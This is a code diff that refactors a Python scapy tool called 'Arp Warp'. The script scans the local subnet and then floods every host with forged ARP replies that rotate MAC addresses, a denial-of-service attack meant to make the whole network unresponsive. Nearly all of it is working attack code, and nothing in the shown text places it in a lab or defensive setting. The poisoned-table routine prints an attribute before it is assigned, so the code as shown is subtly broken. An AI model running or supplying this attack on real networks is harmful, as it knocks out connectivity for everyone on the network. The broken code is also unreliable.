@@ -6,7 +6,7 @@ from scapy.all import *
 
 #   --------------------------------------------------------------------------------------------------------------------
 #
-#   Arp Warp attack - Continously poison the ARP table of all hosts on the connected table to make it unresponsive
+#   Arp Warp attack - Continously poison the ARP cache of all hosts on the connected network to make it unresponsive
 #
 #   Notes
 #       * 
@@ -24,55 +24,50 @@ class ArpWarp:
         self.network_interface = iface
 
         self.my_mac = Ether().src
-        self.my_private_ip = get_if_addr(self.network_interface)  # default interface
+        self.my_private_ip = get_if_addr(self.network_interface)
 
-        self.arp_poison_sleep = 1
+        self.arp_poison_interval = 1
 
         self.subnet = self.my_private_ip.split(".")[:3]
         self.subnet_range = range(0, 256)
 
-        self.original_arp_table = dict()
-        self.gather_original_table()
-        self.scrambled_arp_table = self.generate_poisoned_arp_table()
+        self.original_arp_cache = self.generate_original_cache()
+        self.poisoned_arp_cache = self.generate_poisoned_cache()
 
         self.finished = False
 
-    def get_original_arp_entry(self, tested_ip):
+    def get_original_arp(self, tested_ip):
         arp_packet = ARP(op=1, psrc=self.my_private_ip, hwsrc=self.my_mac, pdst=tested_ip)
         arp_res = srp1(Ether() / arp_packet, timeout=2, iface=self.network_interface)
-        if arp_res:
-            print(f"[+] HOST IS UP {tested_ip} -> {arp_res[ARP].hwsrc}")
-            self.original_arp_table[tested_ip] = arp_res[ARP].hwsrc
+        return arp_res
 
-    def gather_original_table(self):
+    def generate_original_cache(self):
         print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x")
-        temp_threads_list = list()
+        arp_cache = dict()
 
-        for host_part in self.subnet_range:
-            ip = ".".join(self.subnet + [str(host_part)])
-            if ip != self.my_private_ip:
-                t = threading.Thread(target=self.get_original_arp_entry, args=(ip,))
-                temp_threads_list.append(t)
-                t.start()
+        for host_p in self.subnet_range:
+            t_ip = ".".join(self.subnet + [str(host_p)])
+            if t_ip != self.my_private_ip:
+                res = self.get_original_arp(t_ip)
+                if res:
+                    print(f"[+] HOST IS UP {t_ip} -> {res[ARP].hwsrc}")
+                    arp_cache[t_ip] = res[ARP].hwsrc
+        print(f"[*] Finished generating original ARP table...")
+        return arp_cache
 
-        print(f"[*] Waiting for all ARP requests to finish...")
-        for t in temp_threads_list:
-            t.join()
-        print(f"[*] All original ARP entries have been retrieved")
-
-    def generate_poisoned_arp_table(self):
+    def generate_poisoned_cache(self):
         """
         Make a new poisoned table where each key has the value of the preceeding key
         """
         poisoned_table = dict()
-        table_size = len(self.original_arp_table)
-        spoofed_values = [list(self.original_arp_table.values())[i - 1] for i in range(table_size)]
+        table_size = len(self.original_arp_cache)
+        spoofed_values = [list(self.original_arp_cache.values())[i - 1] for i in range(table_size)]
 
         print(f"[*] Preparing poisoned ARP table...")
-        for index, host_ip in enumerate(self.original_arp_table.keys()):
+        for index, host_ip in enumerate(self.original_arp_cache.keys()):
             poisoned_table[host_ip] = spoofed_values[index]
-            print(f"[*] Host {host_ip}\toriginal {self.original_arp_table[host_ip]}"
-                  f"\t spoofed {self.scrambled_arp_table[host_ip]}")
+            print(f"[*] Host {host_ip}\toriginal {self.original_arp_cache[host_ip]}"
+                  f"\t spoofed {self.poisoned_arp_cache[host_ip]}")
 
         print(f"[*] Poisoned ARP table is ready")
         return poisoned_table
@@ -82,10 +77,10 @@ class ArpWarp:
         iterate over all spoofed entries, and send each host (inside an inner loop) the
         arp packets of the scrambled entries
         """
-        for poison_host_ip, poison_host_mac in self.scrambled_arp_table.items():
+        for poison_host_ip, poison_host_mac in self.poisoned_arp_cache.items():
             print(f"[*] Poisoning for {poison_host_ip}...")
 
-            for target_host_ip, target_host_mac in self.original_arp_table.items():
+            for target_host_ip, target_host_mac in self.original_arp_cache.items():
                 if target_host_ip != poison_host_ip:
                     arp_packet = ARP(op=2,
                                      psrc=poison_host_ip,
@@ -98,10 +93,10 @@ class ArpWarp:
         """
         restore the arp table to the original values for all network hosts
         """
-        for restore_host_ip, restore_host_mac in self.original_arp_table.items():
+        for restore_host_ip, restore_host_mac in self.original_arp_cache.items():
             print(f"[*] Restoring for {restore_host_ip}...")
 
-            for target_host_ip, target_host_mac in self.original_arp_table.items():
+            for target_host_ip, target_host_mac in self.original_arp_cache.items():
                 if target_host_ip != restore_host_ip:
                     arp_packet = ARP(op=2,
                                      psrc=restore_host_ip,
@@ -117,7 +112,7 @@ class ArpWarp:
                 loop_count += 1
                 self.poison_arp()
                 print(f"[*] Finished attack loop {loop_count} out of {self.cycle_length}")
-                time.sleep(self.arp_poison_sleep)
+                time.sleep(self.arp_poison_interval)
         except Exception as exc:
             print(f"[!] Exception caught: {exc}")
         finally:
